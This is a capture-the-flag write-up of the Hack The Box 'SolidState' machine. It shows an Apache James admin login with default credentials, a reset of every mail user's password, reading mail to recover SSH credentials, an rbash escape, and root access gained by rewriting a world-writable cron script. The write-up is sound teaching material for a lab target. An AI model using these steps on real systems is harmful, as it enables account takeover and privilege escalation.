# SOLIDSTATE

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox]
└─$ nmap 10.10.10.51      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 02:37 EDT
Nmap scan report for 10.10.10.51
Host is up (0.27s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
4555/tcp open rsip

Nmap done: 1 IP address (1 host up) scanned in 33.60 seconds
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox]
└─$ nmap 10.10.10.51 -p 22,80,25,110,119 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 02:38 EDT
Nmap scan report for 10.10.10.51
Host is up (0.28s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.8 [10.10.14.8]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
...snip...
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/solidstate1.png)

### GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.51  -q -t 100 -x php,html,txt,phtml
/index.html           (Status: 200) [Size: 7776]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
/about.html           (Status: 200) [Size: 7183]                                
/services.html        (Status: 200) [Size: 8404]                                
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]
/README.txt           (Status: 200) [Size: 963]                                 
/LICENSE.txt          (Status: 200) [Size: 17128] 
```

## PORT 4555

After trying to find some vulnerbility on the website and coming up empty handed I used searchsploit to look for `james 2.3.2` and I found a exploit which will give a rce

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ searchsploit james 2.3.2
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation A | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution | linux/remote/35513.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results
----------------------------------------------------- ---------------------------------
 Paper Title                                         |  Path
----------------------------------------------------- ---------------------------------
Exploiting Apache James Server 2.3.2                 | docs/english/40123-exploiting-ap
----------------------------------------------------- ---------------------------------
```

So we need to log in But we do not have creds
On googling default creds for `james 2.3.2` I found them to be `root:root`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ nc 10.10.10.51 4555                 
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

These creds worked 

```bash
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpass mindy mindy
Password for mindy reset
setpassword mailadmin mailadmin
Password for mailadmin reset
```

So I have reset the password of all the users to be same as there names

## PORT 110

Now that we have the users and password maybe we can check there mails

Checking the users one by one

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS james
+OK Welcome james
LIST
+OK 0 0
.
```

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER thomas
+OK
PASS thomas
+OK Welcome thomas
LIST
+OK 0 0
.
```

I did not find anything with james and thomas . Moving on to john

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS john
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

This tells us that mindy have a temporary password sent to her via mail which we can read

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ telnet 10.10.10.51 110                                                         1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

## SSH

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ ssh mindy@10.10.10.51    
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
mindy@10.10.10.51's password:  
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142

mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$
```
Okay so we are able to ssh into the machine but cannot use commands because of rbash

On googling I found this [article](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/) which have different ways to escape rbash 

The very first one is escape via using `-t "bash --noprofile` during ssh

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/solidstate]
└─$ ssh mindy@10.10.10.51 -t "bash --noprofile"
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```
It worked

We can find the user.txt here

## PRIVESEC

On enumerating through the file systems I found a python script which was owned by root but was writtable and executable by our user.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Apr 26 12:37 ..
drwxr-xr-x 11 root root 4096 Apr 26 12:37 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

So maybe this script is being executed by cronjobs 
So I edited the script using `nano` 

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('cat /root/root.txt > /tmp/root.txt ')
except:
     sys.exit()

```

And sure enough after a min we have root.txt in tmp directory

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /tmp
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
root.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat root.txt
```




